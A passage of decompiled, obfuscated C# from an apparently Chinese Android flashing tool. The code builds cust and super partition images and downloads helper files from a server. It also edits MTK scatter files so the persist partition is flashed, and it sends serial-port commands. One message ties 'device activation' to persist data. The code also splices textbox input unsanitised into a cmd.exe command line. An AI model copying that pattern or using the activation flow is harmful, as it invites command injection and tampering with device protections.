			((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11).command = "C:\\TMFTool\\Cust\\make_ext4fs.exe -S C:\\TMFTool\\Cust\\contexts_cust.fs -C C:\\TMFTool\\Cust\\fs_config_cust.fs -L cust -a cust -l 40M cust_" + (string)text + ".img C:\\TMFTool\\Cust\\cust";
			if (((Radio)this.m_15a).Checked)
			{
				((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11).command = "C:\\TMFTool\\Cust\\mkfs.erofs.exe --mount-point cust --fs-config-file C:\\TMFTool\\Cust\\fs_config_cust.fs --file-contexts C:\\TMFTool\\Cust\\contexts_cust.fs cust_" + (string)text + ".img C:\\TMFTool\\Cust\\cust -z lz4";
			}
			await Task.Run(async () =>
			{
				object startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c " + ((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11).command,
					CreateNoWindow = true,
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					WorkingDirectory = "C:\\TMFTool\\Cust\\"
				};
				object obj2 = Process.Start((ProcessStartInfo)startInfo);
				try
				{
					((Process)obj2).StandardOutput.ReadToEnd();
					object value = ((Process)obj2).StandardError.ReadToEnd();
					((Process)obj2).WaitForExit();
					if (!string.IsNullOrEmpty((string)value))
					{
						((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this.fa();
						((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this.fe("OK\n");
						await ((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this._19a();
						((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this._19b();
					}
					else
					{
						((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this.fa();
						((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this.fe("OK\n");
						await ((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this._19a();
					}
				}
				finally
				{
					((IDisposable)obj2)?.Dispose();
				}
			});
		}
		catch (Exception ex)
		{
			object obj = ex;
			fe("调用 cmd 执行命令失败: " + ((Exception)obj).Message);
			_19b();
		}
	}

	private async Task _19a()
	{
		object text = ((Control)this.m_15b).Text;
		object obj = "C:\\TMFTool\\Cust\\cust_" + (string)text + ".img";
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		object path = Path.Combine((string)folderPath, "TMF_Cust");
		if (!Directory.Exists((string)path))
		{
			Directory.CreateDirectory((string)path);
		}
		object obj2 = DateTime.Now.ToString("yyyyMMdd_HHmmss");
		object obj3 = Path.Combine((string)path, "Cust_" + (string)obj2);
		Directory.CreateDirectory((string)obj3);
		object destFileName = Path.Combine((string)obj3, Path.GetFileName((string)obj));
		if (File.Exists((string)obj))
		{
			File.Move((string)obj, (string)destFileName);
			Process.Start("explorer.exe", (string)obj3);
			_19b();
		}
		else
		{
			MessageBox.Show("文件 " + (string)obj + " 不存在！");
		}
	}

	private void _19b()
	{
		string text = "C:\\TMFTool\\Cust\\";
		try
		{
			if (Directory.Exists(text))
			{
				Directory.Delete(text, recursive: true);
			}
		}
		catch (Exception ex)
		{
			fe("删除文件夹失败: " + ex.Message);
		}
	}

	private async Task _19c(object sn)
	{
		object CS_0024_003C_003E8__locals8 = new _003C_003Ec__DisplayClass555_0();
		fe("添加打包参数...");
		((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).filePath1 = "C:\\TMFTool\\Cust\\contexts_cust.fs";
		((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).filePath2 = "C:\\TMFTool\\Cust\\fs_config_cust.fs";
		((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).textToAppend1 = "\n/cust/etc/" + (string)sn + ".prop u:object_r:system_file:s0";
		((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).textToAppend2 = "\ncust/etc/" + (string)sn + ".prop 0 0 0644";
		try
		{
			if (((Radio)this.m_158).Checked)
			{
				await Task.Run(() =>
				{
					using StreamWriter streamWriter = new StreamWriter(((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).filePath1, append: true);
					streamWriter.WriteLine(((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).textToAppend1);
				});
			}
			await Task.Run(() =>
			{
				using StreamWriter streamWriter = new StreamWriter(((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).filePath2, append: true);
				streamWriter.WriteLine(((_003C_003Ec__DisplayClass555_0)CS_0024_003C_003E8__locals8).textToAppend2);
			});
			fa();
			fe("OK\n");
		}
		catch (Exception ex)
		{
			object obj = ex;
			fe("操作失败: " + ((Exception)obj).Message);
		}
	}

	private async void _19d(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object sn = ((Control)this.m_15b).Text.Trim();
		if (string.IsNullOrEmpty(((Control)this.m_15b).Text))
		{
			Msg("未提供有效序列号,请将设备至于开机状态或开机状态输入\nfastboot devices或adb devices 复制序列号!\n");
			return;
		}
		object destinationDirectoryName = "C:\\TMFTool\\Cust";
		if (!Directory.Exists((string)destinationDirectoryName))
		{
			Directory.CreateDirectory((string)destinationDirectoryName);
		}
		object obj = ((!((Radio)this.m_158).Checked) ? "custEROF.zip" : "custEXT4.zip");
		object obj2 = "C:\\TMFTool\\Cust\\CUST.zip";
		object url = string.Concat(str3: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/", str2: (string)obj);
		try
		{
			((Control)this.m_156).Enabled = false;
			((UIProcessBar)this.m_c1).Maximum = 100;
			Msg("配置文件...");
			await _111(url, obj2, (Action<int>)((int progress) =>
			{
				((UIProcessBar)this.m_c1).Value = (int)progress;
			}));
			fa();
			Msg("OK\n");
			if (File.Exists((string)obj2))
			{
				ZipFile.ExtractToDirectory((string)obj2, (string)destinationDirectoryName);
				File.Delete((string)obj2);
				await _198(sn);
			}
			else
			{
				fe("Error\n");
				File.Delete((string)obj2);
			}
		}
		finally
		{
			Msg("注：Cust只可在Android 13及以上版本使用。\nEXT4高通机型为8gen2以及之前(K60除外)，MTK为9000以及之前。\n后续发布的机型选择为EROFS即可。激活设备需搭配persist ACC HEX。\n");
			((Control)this.m_156).Enabled = true;
			_19b();
		}
	}

	private async void _19e(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = new OpenFileDialog
		{
			Filter = "Scatter 文件 (*.xml)|*.xml",
			Title = "请选择一个 Scatter 文件"
		};
		if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
		{
			return;
		}
		object fileName = ((FileDialog)obj).FileName;
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		object path = DateTime.Now.ToString("yyyyMMdd_HHmmss");
		object obj2 = Path.Combine((string)folderPath, "TMFscatter", (string)path);
		try
		{
			Directory.CreateDirectory((string)obj2);
			object fileName2 = Path.GetFileName((string)fileName);
			Msg("用户选择的 Scatter 文件: " + (string)fileName2 + "\n");
			object obj3 = Path.Combine((string)obj2, Path.GetFileName((string)fileName));
			File.Copy((string)fileName, (string)obj3, overwrite: true);
			object obj4 = new XmlDocument();
			((XmlDocument)obj4).Load((string)obj3);
			object elementsByTagName = ((XmlDocument)obj4).GetElementsByTagName("partition_name");
			object enumerator = ((XmlNodeList)elementsByTagName).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj5 = (XmlNode)((IEnumerator)enumerator).Current;
					if (!(((XmlNode)obj5).InnerText.Trim().ToLower() == "persist"))
					{
						continue;
					}
					object parentNode = ((XmlNode)obj5).ParentNode;
					if (parentNode != null)
					{
						object obj6 = ((XmlNode)parentNode).SelectSingleNode("is_download");
						if (obj6 != null && ((XmlNode)obj6).InnerText.Trim().ToLower() == "false")
						{
							((XmlNode)obj6).InnerText = "true";
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			((XmlDocument)obj4).Save((string)obj3);
			Msg("修改文件完成！\n已启用persist分区刷写！\n");
			Process.Start("explorer.exe", (string)obj2);
		}
		catch (Exception ex)
		{
			object obj7 = ex;
			Msg("操作失败：" + ((Exception)obj7).Message + "\n");
		}
	}

	private object _19f(object exePath, object srcPath, object dstPath)
	{
		TaskCompletionSource<bool> tcs = new TaskCompletionSource<bool>();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = (string)exePath;
		processStartInfo.Arguments = "\"" + (string)srcPath + "\" \"" + (string)dstPath + "\"";
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		ProcessStartInfo startInfo = processStartInfo;
		Process proc = new Process();
		proc.StartInfo = startInfo;
		string output = "";
		string error = "";
		proc.OutputDataReceived += (object s, DataReceivedEventArgs e) =>
		{
			if (!string.IsNullOrEmpty(e.Data))
			{
				output = output + e.Data + "\n";
			}
		};
		proc.ErrorDataReceived += (object s, DataReceivedEventArgs e) =>
		{
			if (!string.IsNullOrEmpty(e.Data))
			{
				error = error + e.Data + "\n";
			}
		};
		proc.EnableRaisingEvents = true;
		proc.Exited += (object s, EventArgs e) =>
		{
			bool flag = (!string.IsNullOrEmpty(output) && output.IndexOf("Failed", StringComparison.OrdinalIgnoreCase) >= 0) || (!string.IsNullOrEmpty(error) && error.IndexOf("Failed", StringComparison.OrdinalIgnoreCase) >= 0);
			proc.Dispose();
			tcs.SetResult(!flag);
		};
		proc.Start();
		proc.BeginOutputReadLine();
		proc.BeginErrorReadLine();
		return tcs.Task;
	}

	private async Task _1a0(object root, object basePath, object rawDir)
	{
		object CS_0024_003C_003E8__locals5 = new _003C_003Ec__DisplayClass559_0();
		object obj = ((JsonNode)root)["block_devices"]?.AsArray()?[0];
		if (obj == null)
		{
			Msg("未找到 block_devices\n");
			return;
		}
		object obj2 = ((JsonNode)obj)["block_size"];
		if (obj2 == null)
		{
			Msg("JSON 缺少字段: block_size\n");
			return;
		}
		object item = obj2.ToString();
		object obj3 = ((JsonNode)obj)["alignment"];
		if (obj3 == null)
		{
			Msg("JSON 缺少字段: alignment\n");
			return;
		}
		object item2 = obj3.ToString();
		object obj4 = ((JsonNode)obj)["size"];
		if (obj4 == null)
		{
			Msg("JSON 缺少字段: size\n");
			return;
		}
		object item3 = obj4.ToString();
		object obj5 = ((JsonNode)root)["super_meta"];
		if (obj5 == null)
		{
			Msg("未找到 super_meta\n");
			return;
		}
		object obj6 = ((JsonNode)obj5)["size"];
		if (obj6 == null)
		{
			Msg("JSON 缺少字段: super_meta.size\n");
			return;
		}
		object item4 = obj6.ToString();
		nint num = 2;
		object obj7 = ((JsonNode)root)["groups"]?.AsArray();
		if (obj7 == null)
		{
			Msg("未找到 groups\n");
			return;
		}
		object obj8 = new List<string>();
		object obj9 = new HashSet<string>();
		object enumerator = ((JsonArray)obj7).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object current = ((IEnumerator<JsonNode>)enumerator).Current;
				object obj10 = ((object)((JsonNode)current)["name"])?.ToString() ?? "";
				if (!string.Equals((string)obj10, "default", StringComparison.OrdinalIgnoreCase))
				{
					object obj11 = ((JsonNode)current)["maximum_size"];
					if (obj11 == null)
					{
						Msg("group " + (string)obj10 + " 缺少 maximum_size\n");
						return;
					}
					object obj12 = obj11.ToString();
					((HashSet<string>)obj9).Add((string)obj10);
					((List<string>)obj8).Add("--group " + (string)obj10 + ":" + (string)obj12);
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		if (((List<string>)obj8).Count == 0)
		{
			Msg("未找到有效 groups\n");
			return;
		}
		object obj13 = ((JsonNode)root)["partitions"]?.AsArray();
		if (obj13 == null)
		{
			Msg("未找到 partitions\n");
			return;
		}
		object obj14 = new List<string>();
		object enumerator2 = ((JsonArray)obj13).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator2).MoveNext())
			{
				object current2 = ((IEnumerator<JsonNode>)enumerator2).Current;
				object obj15 = ((object)((JsonNode)current2)["name"])?.ToString() ?? "";
				object obj16 = ((object)((JsonNode)current2)["group_name"])?.ToString() ?? "";
				if (string.IsNullOrEmpty((string)obj15) || string.IsNullOrEmpty((string)obj16))
				{
					Msg("partition 缺少 name 或 group_name\n");
					return;
				}
				if (!((HashSet<string>)obj9).Contains((string)obj16))
				{
					continue;
				}
				if (((string)obj15).EndsWith("_b", StringComparison.OrdinalIgnoreCase))
				{
					((List<string>)obj14).Add("--partition " + (string)obj15 + ":none:0:" + (string)obj16);
					continue;
				}
				object obj17 = ((JsonNode)current2)["size"];
				if (obj17 == null)
				{
					Msg("partition " + (string)obj15 + " 缺少 size\n");
					return;
				}
				object obj18 = obj17.ToString();
				object obj19 = ((object)((JsonNode)current2)["path"])?.ToString() ?? "";
				if (string.IsNullOrEmpty((string)obj19))
				{
					Msg("partition " + (string)obj15 + " 缺少 path\n");
					return;
				}
				if (((string)obj19).StartsWith("IMAGES\\", StringComparison.OrdinalIgnoreCase))
				{
					obj19 = ((string)obj19).Substring("IMAGES\\".Length);
				}
				else if (((string)obj19).StartsWith("IMAGES/", StringComparison.OrdinalIgnoreCase))
				{
					obj19 = ((string)obj19).Substring("IMAGES/".Length);
				}
				object fileNameWithoutExtension = Path.GetFileNameWithoutExtension((string)obj19);
				object obj20 = Path.GetDirectoryName((string)obj19) ?? "";
				if (((string)obj20).StartsWith("IMAGES", StringComparison.OrdinalIgnoreCase))
				{
					obj20 = ((string)obj20).Substring("IMAGES".Length).TrimStart('\\', '/');
				}
				if (((string)obj20).Equals("my_manifest", StringComparison.OrdinalIgnoreCase))
				{
					obj20 = "";
				}
				object obj21 = (string)fileNameWithoutExtension + ".raw";
				object obj22 = ((!((string)obj15).StartsWith("my_", StringComparison.OrdinalIgnoreCase)) ? Path.Combine((string)basePath, "IMAGES", "RAW", (string)obj20, (string)obj21) : Path.Combine((string)basePath, "IMAGES", "RAW", (string)obj21));
				obj22 = ((string)obj22).Replace("/", "\\");
				if (!File.Exists((string)obj22))
				{
					object obj23 = Path.ChangeExtension((string)obj22, ".img");
					if (File.Exists((string)obj23))
					{
						obj22 = obj23;
						Msg("[分区] " + (string)obj15 + " 使用镜像文件: " + Path.GetFileName((string)obj22) + "\n");
					}
					else
					{
						object obj24 = Path.Combine((string)basePath, "IMAGES", (string)fileNameWithoutExtension + ".img");
						if (File.Exists((string)obj24))
						{
							obj22 = obj24;
							Msg("[分区] " + (string)obj15 + " 使用非稀疏镜像文件: " + Path.GetFileName((string)obj22) + "\n");
						}
						else
						{
							Msg("[分区] " + (string)obj15 + " 的镜像文件未找到\n");
						}
					}
				}
				else
				{
					Msg("[分区] " + (string)obj15 + " 使用镜像文件: " + Path.GetFileName((string)obj22) + "\n");
				}
				((List<string>)obj14).Add("--partition " + (string)obj15 + ":none:" + (string)obj18 + ":" + (string)obj16);
				((List<string>)obj14).Add("--image " + (string)obj15 + "=" + (string)obj22);
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		if (((List<string>)obj14).Count == 0)
		{
			Msg("未找到有效 partitions\n");
			return;
		}
		object obj25 = Path.Combine((string)basePath, "IMAGES", "super.img").Replace("/", "\\");
		Msg("速度看电脑磁盘！准备生成\n");
		Msg("[打包]Super...");
		if (!File.Exists((string)this.m_82))
		{
			Msg("找不到 " + (string)this.m_82 + "\n");
			return;
		}
		object obj26 = new List<string>
		{
			"--block-size",
			(string)item,
			"--alignment",
			(string)item2,
			"--device-size",
			(string)item3,
			"--metadata-size",
			(string)item4,
			"--metadata-slots",
			((int)num).ToString()
		};
		((List<string>)obj26).AddRange((IEnumerable<string>)obj8);
		((List<string>)obj26).AddRange((IEnumerable<string>)obj14);
		((List<string>)obj26).Add("--output");
		((List<string>)obj26).Add((string)obj25);
		object obj27 = new List<string>();
		for (nint num2 = 0; num2 < ((List<string>)obj26).Count; num2 += 2)
		{
			if (num2 + 1 < ((List<string>)obj26).Count)
			{
				((List<string>)obj27).Add(((List<string>)obj26)[(int)num2] + " " + ((List<string>)obj26)[(int)(num2 + 1)]);
			}
			else
			{
				((List<string>)obj27).Add(((List<string>)obj26)[(int)num2]);
			}
		}
		object arguments = string.Join(Environment.NewLine, (IEnumerable<string>)obj27);
		new TaskCompletionSource<object>();
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)this.m_82,
			Arguments = (string)arguments,
			RedirectStandardOutput = false,
			RedirectStandardError = false,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		((_003C_003Ec__DisplayClass559_0)CS_0024_003C_003E8__locals5).proc = new Process();
		((_003C_003Ec__DisplayClass559_0)CS_0024_003C_003E8__locals5).proc.StartInfo = (ProcessStartInfo)startInfo;
		((_003C_003Ec__DisplayClass559_0)CS_0024_003C_003E8__locals5).proc.Start();
		await Task.Run(() =>
		{
			((_003C_003Ec__DisplayClass559_0)CS_0024_003C_003E8__locals5).proc.WaitForExit();
		});
		if (((_003C_003Ec__DisplayClass559_0)CS_0024_003C_003E8__locals5).proc.ExitCode == 0)
		{
			fa();
			Msg("OK\n");
			Msg("输出路径: " + (string)obj25 + "\n");
		}
		else
		{
			EnableButtons();
			msgred();
			Msg("Error\n可能为磁盘空间不足!目录禁止使用空格！\n");
			((Checkbox)this.m_161).Checked = false;
		}
	}

	private async void _1a1(object basePath, object root)
	{
		object obj = ((JsonNode)root)["partitions"];
		if (obj == null)
		{
			Msg("未找到 partitions，无法删除原始文件\n");
			return;
		}
		object obj2 = ((JsonNode)obj).AsArray();
		if (obj2 == null || ((JsonArray)obj2).Count == 0)
		{
			Msg("partitions 为空，无法删除原始文件\n");
			return;
		}
		object obj3 = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		object enumerator = ((JsonArray)obj2).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object current = ((IEnumerator<JsonNode>)enumerator).Current;
				object obj4 = ((JsonNode)current)["path"];
				if (obj4 == null)
				{
					continue;
				}
				object obj5 = obj4.ToString();
				if (string.IsNullOrEmpty((string)obj5))
				{
					continue;
				}
				object obj6 = Path.Combine((string)basePath, ((string)obj5).Replace("/", "\\"));
				object obj7 = Path.GetDirectoryName((string)obj6);
				if (string.IsNullOrEmpty((string)obj7))
				{
					obj7 = "";
				}
				if (File.Exists((string)obj6))
				{
					try
					{
						File.Delete((string)obj6);
					}
					catch (Exception ex)
					{
						object obj8 = ex;
						Msg("删除原始文件失败: " + (string)obj6 + "，原因: " + ((Exception)obj8).Message + "\n");
					}
				}
				else
				{
					Msg("原始文件不存在: " + (string)obj6 + "\n");
				}
				((HashSet<string>)obj3).Add((string)obj7);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		foreach (string item in (HashSet<string>)obj3)
		{
			try
			{
				if (!string.Equals(b: Path.Combine((string)basePath, "IMAGES").TrimEnd('\\', '/'), a: item.TrimEnd('\\', '/'), comparisonType: StringComparison.OrdinalIgnoreCase) && Directory.Exists(item))
				{
					Directory.Delete(item, recursive: true);
				}
			}
			catch (Exception ex2)
			{
				Msg("删除目录失败: " + item + "，原因: " + ex2.Message + "\n");
			}
		}
	}

	private async Task _1a2()
	{
		object destinationDirectoryName = "C:\\TMFTool";
		object obj = "C:\\TMFTool\\super.zip";
		object url = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/super.zip");
		try
		{
			((Control)this.m_156).Enabled = false;
			((UIProcessBar)this.m_c1).Maximum = 100;
			Msg("配置文件...");
			await _111(url, obj, (Action<int>)((int progress) =>
			{
				((UIProcessBar)this.m_c1).Value = (int)progress;
			}));
			fa();
			Msg("OK\n");
			if (File.Exists((string)obj))
			{
				ZipFile.ExtractToDirectory((string)obj, (string)destinationDirectoryName);
				File.Delete((string)obj);
			}
			else
			{
				fe("Error\n");
				File.Delete((string)obj);
			}
		}
		finally
		{
			File.Delete((string)obj);
			_19b();
		}
	}

	private async void _1a3(object sender, object e)
	{
		object obj = (object)new VistaFolderBrowserDialog();
		try
		{
			((VistaFolderBrowserDialog)obj).Description = "请选择散包根目录";
			((VistaFolderBrowserDialog)obj).UseDescriptionForTitle = true;
			((VistaFolderBrowserDialog)obj).ShowNewFolderButton = true;
			if (((CommonDialog)obj).ShowDialog((IWin32Window)this) == DialogResult.OK)
			{
				object selectedPath = ((VistaFolderBrowserDialog)obj).SelectedPath;
				if (((string)selectedPath).Contains(" "))
				{
					msgred();
					Msg("选择的目录路径不能包含空格，请重新选择！\n");
					return;
				}
				Msg("散包路径: ");
				fa();
				Msg((string)selectedPath + "\n");
				object obj2 = Path.Combine((string)selectedPath, "META\\super_def.00000000.json");
				if (!File.Exists((string)obj2))
				{
					msgred();
					Msg("非有效散包目录,请选择散包根目录！\n");
					return;
				}
				object obj3 = Path.Combine((string)selectedPath, "IMAGES\\RAW");
				try
				{
					if (!File.Exists((string)this.m_83))
					{
						await _1a2();
					}
					if (Directory.Exists((string)obj3))
					{
						Msg("清空 RAW 目录...OK");
						Directory.Delete((string)obj3, recursive: true);
					}
					Directory.CreateDirectory((string)obj3);
					object obj4 = File.ReadAllText((string)obj2);
					object obj5 = JsonNode.Parse((string)obj4, (JsonNodeOptions?)null, default(JsonDocumentOptions));
					if (obj5 == null)
					{
						Msg("无法解析 JSON。\n");
						return;
					}
					object obj6 = ((JsonNode)obj5)["partitions"];
					if (obj6 == null || !((IEnumerable<JsonNode>)(object)((JsonNode)obj6).AsArray()).Any())
					{
						Msg("JSON 中未找到 partitions。\n");
						return;
					}
					object obj7 = ((JsonNode)obj6).AsArray();
					if (!File.Exists((string)this.m_83))
					{
						Msg("找不到 " + (string)this.m_83);
						return;
					}
					falseButtons();
					object enumerator = ((JsonArray)obj7).GetEnumerator();
					try
					{
						while (((IEnumerator)enumerator).MoveNext())
						{
							object current = ((IEnumerator<JsonNode>)enumerator).Current;
							object obj8 = ((JsonNode)current)["path"];
							if (obj8 == null)
							{
								continue;
							}
							object obj9 = obj8.ToString();
							if (!string.IsNullOrEmpty((string)obj9))
							{
								object fileName = Path.GetFileName((string)obj9);
								object fileNameWithoutExtension = Path.GetFileNameWithoutExtension((string)obj9);
								object srcPath = Path.Combine((string)selectedPath, ((string)obj9).Replace("/", "\\"));
								object dstPath = Path.Combine((string)obj3, (string)fileNameWithoutExtension + ".raw");
								Msg("[转换] " + (string)fileName + " > " + (string)fileNameWithoutExtension + ".raw... ");
								nint num = ((await (Task<bool>)_19f(this.m_83, srcPath, dstPath)) ? 1 : 0);
								IntPtr intPtr = num;
								if (intPtr == (IntPtr)0)
								{
									fb();
									Msg("Skip\n");
									File.Delete((string)dstPath);
								}
								else
								{
									fa();
									Msg("OK\n");
								}
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
					await _1a0(obj5, selectedPath, obj3);
					EnableButtons();
					if (((Checkbox)this.m_161).Checked)
					{
						Msg("清理散包...");
						_1a1(selectedPath, obj5);
						fa();
						Msg("Msg\n");
					}
					if (Directory.Exists((string)obj3))
					{
						Directory.Delete((string)obj3, recursive: true);
					}
				}
				catch (Exception ex)
				{
					EnableButtons();
					Msg("出错: " + ex.Message + "\n");
				}
			}
			else
			{
				Msg("取消选择目录!\n");
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async void _1a4(object sender, object e)
	{
		object obj = new OpenFileDialog();
		try
		{
			((FileDialog)obj).Filter = "super*.img|super*.img";
			((OpenFileDialog)obj).Multiselect = true;
			((FileDialog)obj).Title = "选择 super*.img 文件";
			if (((CommonDialog)obj).ShowDialog() != DialogResult.OK || ((FileDialog)obj).FileNames.Length == 0)
			{
				Msg("未选择任何文件！");
				return;
			}
			object directoryName = Path.GetDirectoryName(((FileDialog)obj).FileNames[0]);
			object arg = Path.Combine((string)directoryName, "super.img");
			if (!File.Exists((string)this.m_83))
			{
				await _1a2();
			}
			if (!File.Exists((string)this.m_83))
			{
				MessageBox.Show("未找到 simg2img.exe", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			object obj2 = new StringBuilder();
			Msg("分段文件:\n");
			object fileNames = ((FileDialog)obj).FileNames;
			for (nint num = 0; num < ((Array)fileNames).Length; num++)
			{
				object arg2 = ((object[])fileNames)[num];
				((StringBuilder)obj2).AppendFormat("\"{0}\" ", arg2);
				object fileName = Path.GetFileName((string)arg2);
				Msg((string)fileName + "\n");
			}
			((StringBuilder)obj2).AppendFormat("\"{0}\"", arg);
			Msg("合并速度与电脑磁盘有关！\n");
			Msg("开始写入新文件 super.img...");
			falseButtons();
			nint num2 = ((await (Task<bool>)_1a5(this.m_83, obj2.ToString())) ? 1 : 0);
			IntPtr intPtr = num2;
			if ((int)(nint)intPtr != 0)
			{
				EnableButtons();
				fa();
				Msg("OK\n");
				DialogResult dialogResult = MessageBox.Show("合并 super.img 完成！是否打开文件所在目录？", "成功", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (dialogResult == DialogResult.Yes)
				{
					object directoryName2 = Path.GetDirectoryName((string)arg);
					if (!string.IsNullOrEmpty((string)directoryName2) && Directory.Exists((string)directoryName2))
					{
						Process.Start("explorer.exe", (string)directoryName2);
					}
				}
			}
			else
			{
				EnableButtons();
				msgred();
				Msg("Error\n");
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private object _1a5(object exePath, object arguments)
	{
		TaskCompletionSource<bool> tcs = new TaskCompletionSource<bool>();
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = (string)exePath,
				Arguments = (string)arguments,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			Process proc = new Process();
			proc.StartInfo = startInfo;
			proc.EnableRaisingEvents = true;
			proc.Exited += (object s, EventArgs e) =>
			{
				if (proc.ExitCode == 0)
				{
					tcs.TrySetResult(result: true);
				}
				else
				{
					tcs.TrySetResult(result: false);
				}
				proc.Dispose();
			};
			proc.Start();
		}
		catch (Exception)
		{
			tcs.TrySetResult(result: false);
		}
		return tcs.Task;
	}

	private async void _1a6(object sender, object e)
	{
		object obj = new _003C_003Ec__DisplayClass567_0();
		((_003C_003Ec__DisplayClass567_0)obj)._003C_003E4__this = this;
		nint num = int.Parse(((Control)this.m_168).Text);
		((_003C_003Ec__DisplayClass567_0)obj).command = ((Control)this.m_167).Text;
		if (string.IsNullOrEmpty(((_003C_003Ec__DisplayClass567_0)obj).command))
		{
			Msg("请输入命令!\n");
			return;
		}
		object CS_0024_003C_003E8__locals11 = new _003C_003Ec__DisplayClass567_1();
		((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass567_0)obj;
		((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl = new SerialPort(((Control)this.m_126).Text, (int)num);
		try
		{
			try
			{
				Msg("打开端口...");
				((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl.Open();
			}
			catch
			{
				msgred();
				Msg("无法打开端口\n");
				return;
			}
			fa();
			Msg("OK\n");
			await Task.Run(async () =>
			{
				object obj3 = await LinQcPortClass.xmlinfo(((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl, ((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).CS_0024_003C_003E8__locals1.command);
				((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("发送命令: " + ((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).CS_0024_003C_003E8__locals1.command + "\n");
				((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("设备返回" + (string)obj3 + "\n");
			});
			((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl.Close();
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl != null)
			{
				((IDisposable)((_003C_003Ec__DisplayClass567_1)CS_0024_003C_003E8__locals11).SepSl).Dispose();
			}
		}
	}

	private void _1a7(object sender, BoolEventArgs e)
	{
	}

	private void _1a8(object sender, object e)
	{
		bool flag = ((CheckBox)this.m_173).Checked;
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_16e).Rows)
		{
			if (item.Cells["checke"] is DataGridViewCheckBoxCell dataGridViewCheckBoxCell)
			{
				dataGridViewCheckBoxCell.Value = flag;
			}
		}
	}

	private void _1a9(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void _1aa(object sender, EventArgs e)
	{
	}

	private void _1ab(object sender, object e)
	{
		if (((DataGridViewCellMouseEventArgs)e).RowIndex < 0 || ((DataGridView)this.m_16e).Rows[((DataGridViewCellMouseEventArgs)e).RowIndex].IsNewRow)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "镜像文件 (*.img)|*.img|所有文件 (*.*)|*.*";
		openFileDialog.Title = "请选择镜像文件";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = openFileDialog.FileName;
